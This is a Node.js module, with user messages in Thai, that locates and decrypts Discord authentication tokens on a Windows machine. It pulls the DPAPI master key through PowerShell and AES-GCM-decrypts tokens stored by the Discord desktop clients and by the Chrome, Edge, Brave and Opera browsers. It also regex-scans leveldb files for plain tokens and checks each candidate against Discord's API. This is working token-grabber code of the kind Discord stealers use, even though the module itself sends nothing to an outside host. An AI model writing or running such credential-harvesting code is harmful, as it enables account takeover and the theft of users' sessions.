const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const { execSync } = require('node:child_process');

function getMasterKey(localStatePath) {
  if (!fs.existsSync(localStatePath)) return null;
  try {
    const raw = fs.readFileSync(localStatePath, 'utf8');
    const localState = JSON.parse(raw);
    if (!localState.os_crypt?.encrypted_key) return null;

    const encKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
    const dpapiBytes = encKey.subarray(5); // Remove 'DPAPI' (5 bytes)
    const b64Input = dpapiBytes.toString('base64');

    const psScript = `Add-Type -AssemblyName System.Security; [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('${b64Input}'), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))`;
    const masterKeyB64 = execSync(`powershell -NoProfile -Command "${psScript}"`, { encoding: 'utf8' }).trim();
    return Buffer.from(masterKeyB64, 'base64');
  } catch (e) {
    return null;
  }
}

function scanStorageFiles(storageDir, masterKey, tokens) {
  if (!fs.existsSync(storageDir)) return;
  try {
    const files = fs.readdirSync(storageDir).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
    for (const file of files) {
      try {
        const fullPath = path.join(storageDir, file);
        const content = fs.readFileSync(fullPath);

        // 1. Encrypted Discord token pattern: dQw4w9WgXcQ:BASE64
        if (masterKey) {
          const regexEnc = /dQw4w9WgXcQ:([A-Za-z0-9+/=]+)/g;
          let match;
          while ((match = regexEnc.exec(content.toString('latin1'))) !== null) {
            try {
              const encVal = Buffer.from(match[1], 'base64');
              const iv = encVal.subarray(3, 15);
              const payload = encVal.subarray(15);
              const tag = payload.subarray(payload.length - 16);
              const ciphertext = payload.subarray(0, payload.length - 16);

              const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
              decipher.setAuthTag(tag);
              let decrypted = decipher.update(ciphertext, null, 'utf8');
              decrypted += decipher.final('utf8');
              if (decrypted && decrypted.length >= 50 && /^[A-Za-z0-9_\-\.]+$/.test(decrypted)) {
                tokens.add(decrypted);
              }
            } catch (err) {}
          }
        }

        // 2. Plain regex fallback (for unencrypted browser tokens)
        const regexPlain = /[\"\'](?:token|authorization)[\"\']\s*:\s*[\"\']([A-Za-z0-9_\-\.]{50,120})[\"\']/gi;
        let pMatch;
        const strContent = content.toString('utf8', 0, Math.min(content.length, 1024 * 1024 * 4));
        while ((pMatch = regexPlain.exec(strContent)) !== null) {
          if (pMatch[1] && pMatch[1].length >= 55) {
            tokens.add(pMatch[1]);
          }
        }
      } catch (e) {}
    }
  } catch (e) {}
}

async function validateTokenWithDiscord(token) {
  try {
    const res = await fetch('https://discord.com/api/v9/users/@me', {
      headers: {
        'Authorization': token.trim(),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
      }
    });
    if (res.ok) {
      const user = await res.json();
      return { valid: true, user };
    }
  } catch (e) {}
  return { valid: false, user: null };
}

async function findLocalDiscordToken() {
  const candidateTokens = new Set();
  const appData = process.env.APPDATA || '';
  const localAppData = process.env.LOCALAPPDATA || '';

  // Target paths for Discord desktop clients
  const discordClients = [
    { name: 'Discord Desktop', dir: path.join(appData, 'discord') },
    { name: 'Discord Canary', dir: path.join(appData, 'discordcanary') },
    { name: 'Discord PTB', dir: path.join(appData, 'discordptb') },
    { name: 'Lightcord', dir: path.join(appData, 'Lightcord') }
  ];

  for (const client of discordClients) {
    if (!fs.existsSync(client.dir)) continue;
    const masterKey = getMasterKey(path.join(client.dir, 'Local State'));
    scanStorageFiles(path.join(client.dir, 'Local Storage', 'leveldb'), masterKey, candidateTokens);
  }

  // Target paths for browsers
  const browserBases = [
    path.join(localAppData, 'Google', 'Chrome', 'User Data'),
    path.join(localAppData, 'Microsoft', 'Edge', 'User Data'),
    path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    path.join(appData, 'Opera Software', 'Opera Stable')
  ];

  for (const base of browserBases) {
    if (!fs.existsSync(base)) continue;
    const masterKey = getMasterKey(path.join(base, 'Local State'));
    const profiles = ['Default', 'Profile 1', 'Profile 2', ''];
    for (const p of profiles) {
      const storageDir = p ? path.join(base, p, 'Local Storage', 'leveldb') : path.join(base, 'Local Storage', 'leveldb');
      scanStorageFiles(storageDir, masterKey, candidateTokens);
    }
  }

  // Validate candidates
  for (const token of candidateTokens) {
    const { valid, user } = await validateTokenWithDiscord(token);
    if (valid) {
      return {
        success: true,
        token,
        user
      };
    }
  }

  return {
    success: false,
    message: candidateTokens.size > 0 
      ? 'ตรวจพบข้อมูล Token แต่ไม่สามารถตรวจสอบความถูกต้องกับ Discord ได้ (Token อาจหมดอายุ)' 
      : 'ไม่พบ Discord Token ในเครื่อง กรุณาเปิด Discord หรือล็อกอินใน Discord Web ก่อน'
  };
}

module.exports = {
  findLocalDiscordToken
};
